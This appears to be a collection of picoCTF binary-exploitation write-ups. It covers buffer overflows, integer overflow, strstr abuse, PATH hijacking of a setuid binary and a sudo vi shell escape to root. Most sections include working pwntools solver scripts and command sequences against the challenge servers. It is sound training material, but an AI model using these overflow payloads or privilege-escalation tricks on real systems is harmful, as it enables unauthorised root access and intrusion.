### buffer overflow 0

Download the file and just fuzz it. I randomly inserted 30 bytes and got the flag.

```bash
➜  Binary-Exploitation git:(main) ✗ nc saturn.picoctf.net 61481
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{XXX}
```

### CVE-XXXX-XXXX

Just Google `first recorded remote code execution (RCE) vulnerability in 2021 in the Windows Print Spooler Service`.

![](../assets/cve-xxx-xxxxx.png)

### two-sum

Download the file and `cat` its content.

```c
#include <stdio.h>
#include <stdlib.h>

static int addIntOvf(int result, int a, int b) {
    result = a + b;
    if(a > 0 && b > 0 && result < 0)
        return -1;
    if(a < 0 && b < 0 && result > 0)
        return -1;
    return 0;
}

int main() {
    int num1, num2, sum;
    FILE *flag;
    char c;

    printf("n1 > n1 + n2 OR n2 > n1 + n2 \n");
    fflush(stdout);
    printf("What two positive numbers can make this possible: \n");
    fflush(stdout);
    
    if (scanf("%d", &num1) && scanf("%d", &num2)) {
        printf("You entered %d and %d\n", num1, num2);
        fflush(stdout);
        sum = num1 + num2;
        if (addIntOvf(sum, num1, num2) == 0) {
            printf("No overflow\n");
            fflush(stdout);
            exit(0);
        } else if (addIntOvf(sum, num1, num2) == -1) {
            printf("You have an integer overflow\n");
            fflush(stdout);
        }

        if (num1 > 0 || num2 > 0) {
            flag = fopen("flag.txt","r");
            if(flag == NULL){
                printf("flag not found: please run this on the server\n");
                fflush(stdout);
                exit(0);
            }
            char buf[60];
            fgets(buf, 59, flag);
            printf("YOUR FLAG IS: %s\n", buf);
            fflush(stdout);
            exit(0);
        }
    }
    return 0;
}
```

To print the flag we need to add two positive integers and have a negative result. We will add the `MAX_INT` value in `C` and `1` to achieve an integer overflow and get the flag.

```python
from pwn import *

context.log_level = 'critical'

r = remote('saturn.picoctf.net', 54011)

r.sendline(b'2147483647')
r.sendline(b'1')
print(f'\n{r.recvline_contains(b"pico").strip().decode()}\n')
```

```bash
➜  Binary-Exploitation git:(main) ✗ python solver.py

YOUR FLAG IS: picoCTF{XXX}
```

### buffer overflow 1

Download the files and `cat vuln.c` 

```c
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

We see there is a function that prints the flag (`win()`) and a `gets()`.

So, we have a typical `ret2win` challenge. We just need to find the offset to overwrite the return address and the address of `win()`.

We create a pattern in `gdb` and see that it crashed here:

```gdb
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

```gdb
0xffffd040│+0x0000: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"	 ← $esp
0xffffd044│+0x0004: "naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaaza[...]"
0xffffd048│+0x0008: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabba[...]"
0xffffd04c│+0x000c: "paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabca[...]"
0xffffd050│+0x0010: "qaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabda[...]"
0xffffd054│+0x0014: "raaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabea[...]"
0xffffd058│+0x0018: "saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfa[...]"
0xffffd05c│+0x001c: "taaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabga[...]"
───────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161616c
───────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x6161616c in ?? (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────── trace ────
──────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern offset  maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaa
[+] Searching for 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaa'
[+] Found at offset 48 (big-endian search) 
```

We need to subtract 4 bytes to reach this value. The address of `win()` can be found with `pwntools`.

```python
from pwn import *

context.log_level = 'critical'

r = remote('saturn.picoctf.net', 58135)

e = ELF('./vuln')

r.sendline(b'A'*44 + p32(e.sym.win))

r.recvuntil(b'pico')

print(f'\nFlag --> pico{r.recv().decode()}\n')
```

```bash
➜  Binary-Exploitation git:(main) ✗ python solver.py

Flag --> picoCTF{XXX}
```

### RPS

Download the file and `cat` its content.

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/types.h>


#define WAIT 60



static const char* flag = "[REDACTED]";

char* hands[3] = {"rock", "paper", "scissors"};
char* loses[3] = {"paper", "scissors", "rock"};
int wins = 0;



int tgetinput(char *input, unsigned int l)
{
    fd_set          input_set;
    struct timeval  timeout;
    int             ready_for_reading = 0;
    int             read_bytes = 0;
    
    if( l <= 0 )
    {
      printf("'l' for tgetinput must be greater than 0\n");
      return -2;
    }
    
    
    /* Empty the FD Set */
    FD_ZERO(&input_set );
    /* Listen to the input descriptor */
    FD_SET(STDIN_FILENO, &input_set);

    /* Waiting for some seconds */
    timeout.tv_sec = WAIT;    // WAIT seconds
    timeout.tv_usec = 0;    // 0 milliseconds

    /* Listening for input stream for any activity */
    ready_for_reading = select(1, &input_set, NULL, NULL, &timeout);
    /* Here, first parameter is number of FDs in the set, 
     * second is our FD set for reading,
     * third is the FD set in which any write activity needs to updated,
     * which is not required in this case. 
     * Fourth is timeout
     */

    if (ready_for_reading == -1) {
        /* Some error has occured in input */
        printf("Unable to read your input\n");
        return -1;
    } 

    if (ready_for_reading) {
        read_bytes = read(0, input, l-1);
        if(input[read_bytes-1]=='\n'){
        --read_bytes;
        input[read_bytes]='\0';
        }
        if(read_bytes==0){
            printf("No data given.\n");
            return -4;
        } else {
            return 0;
        }
    } else {
        printf("Timed out waiting for user input. Press Ctrl-C to disconnect\n");
        return -3;
    }

    return 0;
}


bool play () {
  char player_turn[100];
  srand(time(0));
  int r;

  printf("Please make your selection (rock/paper/scissors):\n");
  r = tgetinput(player_turn, 100);
  // Timeout on user input
  if(r == -3)
  {
    printf("Goodbye!\n");
    exit(0);
  }

  int computer_turn = rand() % 3;
  printf("You played: %s\n", player_turn);
  printf("The computer played: %s\n", hands[computer_turn]);

  if (strstr(player_turn, loses[computer_turn])) {
    puts("You win! Play again?");
    return true;
  } else {
    puts("Seems like you didn't win this time. Play again?");
    return false;
  }
}


int main () {
  char input[3] = {'\0'};
  int command;
  int r;

  puts("Welcome challenger to the game of Rock, Paper, Scissors");
  puts("For anyone that beats me 5 times in a row, I will offer up a flag I found");
  puts("Are you ready?");
  
  while (true) {
    puts("Type '1' to play a game");
    puts("Type '2' to exit the program");
    r = tgetinput(input, 3);
    // Timeout on user input
    if(r == -3)
    {
      printf("Goodbye!\n");
      exit(0);
    }
    
    if ((command = strtol(input, NULL, 10)) == 0) {
      puts("Please put in a valid number");
      
    } else if (command == 1) {
      printf("\n\n");
      if (play()) {
        wins++;
      } else {
        wins = 0;
      }

      if (wins >= 5) {
        puts("Congrats, here's the flag!");
        puts(flag);
      }
    } else if (command == 2) {
      return 0;
    } else {
      puts("Please type either 1 or 2");
    }
  }

  return 0;
}
```

Focus on the important stuff.

We need 5 wins to get the flag.

```c
  if (wins >= 5) {
    puts("Congrats, here's the flag!");
    puts(flag);
  }
```

The program checks our answer with `strstr`.

```c
  if (strstr(player_turn, loses[computer_turn])) {
    puts("You win! Play again?");
```

From the `man` page of `strstr`:

```bash
STRSTR(3)                        Linux Programmer's Manual                        STRSTR(3)

NAME
       strstr, strcasestr - locate a substring

SYNOPSIS
       #include <string.h>

       char *strstr(const char *haystack, const char *needle);

       #define _GNU_SOURCE         /* See feature_test_macros(7) */

       #include <string.h>

       char *strcasestr(const char *haystack, const char *needle);

DESCRIPTION
       The  strstr()  function  finds  the  first occurrence of the substring needle in the
       string haystack.  The terminating null bytes ('\0') are not compared.
```

So, if we give all the possible answers as input, it will always come true and win.

```python
from pwn import *

r = remote('saturn.picoctf.net', 53864)

for i in range(5):
	r.sendline(b'1')
	r.sendline(b'rockpaperscissors')

r.recvuntil(b'pico')

print(f'\nFlag --> pico{r.recvuntil(b"}").decode()}\n')
```

```bash
➜  Binary-Exploitation git:(main) ✗ python solver.py
[+] Opening connection to saturn.picoctf.net on port 53864: Done

Flag --> picoCTF{50M3_3X7R3M3_1UCK_B69E01B8}

[*] Closed connection to saturn.picoctf.net port 53864
```

### clutter-overflow

Download the files and `cat chall.c`.

```c
#include <stdio.h>
#include <stdlib.h>

#define SIZE 0x100
#define GOAL 0xdeadbeef

const char* HEADER = 
" ______________________________________________________________________\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \\^ ^ |\n"
"|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \\ ^ _ ^ / |                | \\^ ^|\n"
"| ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | //  | /_\\ ^| |   ____  ____   | | ^ |\n"
"|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|\n"
"| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |\n"
"|^ ^ ^ ^ ^| /     (   \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \\|^ ^|\n"
".-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |\n"
"|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\\ |^ ^|\n"
"| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |\n"
"|'.____'_^||/!\\@@@@@/!\\|| _'______________.'|==                    =====\n"
"|\\|______|===============|________________|/|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\" ||\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"  \n"
"\"\"''\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"";

int main(void)
{
  long code = 0;
  char clutter[SIZE];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);
 	
  puts(HEADER); 
  puts("My room is so cluttered...");
  puts("What do you see?");

  gets(clutter);


  if (code == GOAL) {
    printf("code == 0x%llx: how did that happen??\n", GOAL);
    puts("take a flag for your troubles");
    system("cat flag.txt");
  } else {
    printf("code == 0x%llx\n", code);
    printf("code != 0x%llx :(\n", GOAL);
  }

  return 0;
}
```

Pretty straight-forward challenge. We have a `gets()` to trigger a Buffer Overflow and all we have to do is change `code` value from `0` to `0xdeadbeef`.  Let's open a debugger to find the offset where we overwrite the `code` which is placed on the stack.

```gdb
gef➤  pattern create 300
[+] Generating a pattern of 300 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
```

In the beginning of `main`, we saw that the `code` value is placed on `$rbp-0x8`. We will find the offset till `$rbp` and then subtract `8`.

```gdb
gef➤  pattern offset $rbp
[+] Searching for '$rbp'
[+] Found at offset 272 (little-endian search) likely
```

Great! The offset is `272-8`. The only thing left now, is to overwrite the value with `0xdeadbeef`.

```python
#!/usr/bin/python3.8
from pwn import *
import warnings
warnings.filterwarnings('ignore')
context.log_level = 'critical'

r = remote('mars.picoctf.net', 31890)

r.sendline(b'A'*264 + p64(0xdeadbeef))
print(f'\nFlag --> {r.recvline_contains(b"pico").strip().decode()}\n')
```

```bash
➜  clutter-overflow git:(main) ✗ python solver.py

Flag --> picoCTF{XXX}
```

### VNE

Connect to the remote instance via `ssh ctf-player@saturn.picoctf.net -p 63339` and run `./bin`

```bash
ctf-player@pico-chall$ ./bin 
Error: SECRET_DIR environment variable is not set
```

We need to set the `SECRET_DIR` env variable to something. Let's try `cat /root/flag.txt`.

```bash
ctf-player@pico-chall$ export SECRET_DIR="cat /root/flag.txt" && ./bin 
Listing the content of cat /root/flag.txt as root: 
ls: cannot access 'cat': No such file or directory
/root/flag.txt
Error: system() call returned non-zero value: 512
```

As we can notice, the binary runs `ls(SECRET_DIR)`. It prints the file location but it produces the error `ls: cannot access 'cat': No such file or directory`.

Now, we need to bypass `ls` to print the flag. 

The program runs as `root`. We can trick it to think that it runs the actual `ls`, but instead it runs a `symbolic link` we create.

```bash
ctf-player@pico-chall$ ln -s `which cat` ls
ctf-player@pico-chall$ ls
bin  ls
ctf-player@pico-chall$ ls -la
total 24
drwxr-xr-x 1 ctf-player ctf-player    30 Apr  3 01:31 .
drwxr-xr-x 1 root       root          24 Mar 16 01:59 ..
drwx------ 2 ctf-player ctf-player    34 Apr  3 01:30 .cache
-rw-r--r-- 1 root       root          67 Mar 16 01:59 .profile
-rwsr-xr-x 1 root       root       18752 Mar 16 01:59 bin
lrwxrwxrwx 1 ctf-player ctf-player    12 Apr  3 01:31 ls -> /usr/bin/cat
```

Then, export the `PATH` to our current directory.

```bash
ctf-player@pico-chall$ export PATH=`pwd`
ctf-player@pico-chall$ echo $PATH
/home/ctf-player
```

The create the `SECRET_DIR` var with `/root/flag.txt`.

```bash
export SECRET_DIR="/root/flag.txt"
```

```bash
ln -s `which cat` ls && \
export PATH=`pwd` && \
export SECRET_DIR="/root/flag.txt" && \
./bin | /usr/bin/grep pico && \
/usr/bin/rm ls
```

```bash
ctf-player@pico-chall$ ln -s `which cat` ls && \
> export PATH=`pwd` && \
> export SECRET_DIR="/root/flag.txt" && \
> ./bin | /usr/bin/grep pico && \
> /usr/bin/rm ls
picoCTF{XXX}
```

### hijacking

Connect to the remote server via `ssh picoctf@saturn.picoctf.net -p 53359`.

We run `sudo -l` to check what we can run as `root`.

```bash
picoctf@challenge:~$ sudo -l
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
```

We see that we can use `vi`.

We will abuse this to spawn shell as root.

```bash
picoctf@challenge:~$ sudo vi -c ':!/bin/sh' 
[sudo] password for picoctf:
```

The password is given: `g9JyzMCWpU`.

To have a more interactive shell we run `python3 -c 'import pty; pty.spawn("/bin/bash")'`.

```bash
# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@challenge:/home/picoctf# 
```

The flag is located in `/challenge` inside the `metadata.json` file.

```bash
root@challenge:/# ls challenge/
metadata.json
root@challenge:/# cat challenge/metadata.json 
{"flag": "picoCTF{XXX}", "username": "picoctf", "password": "g9JyzMCWpU"}root@challenge:/# Connection to saturn.picoctf.net closed by remote host.
```



